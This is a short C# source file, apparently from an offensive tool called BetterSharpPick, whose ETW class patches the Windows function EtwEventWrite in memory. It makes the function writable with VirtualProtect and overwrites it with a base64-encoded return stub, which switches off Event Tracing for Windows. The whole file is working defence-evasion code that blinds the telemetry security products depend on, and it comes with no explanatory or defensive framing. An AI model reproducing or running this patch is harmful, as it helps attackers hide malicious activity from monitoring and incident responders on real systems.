using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static BetterSharpPick.Patch.Common;

namespace BetterSharpPick.Patch
{
    public class ETW
    {
        public static void Patch()
        {
            IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
            IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

            VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            var patch = getETWPayload();
            uint oldProtect;

            if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
            {
                Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
                Console.WriteLine("[+] Successfully unhooked ETW!");
            }
        }

        private static byte[] getETWPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("whQA");
            return Convert.FromBase64String("ww==");
        }
    }
}
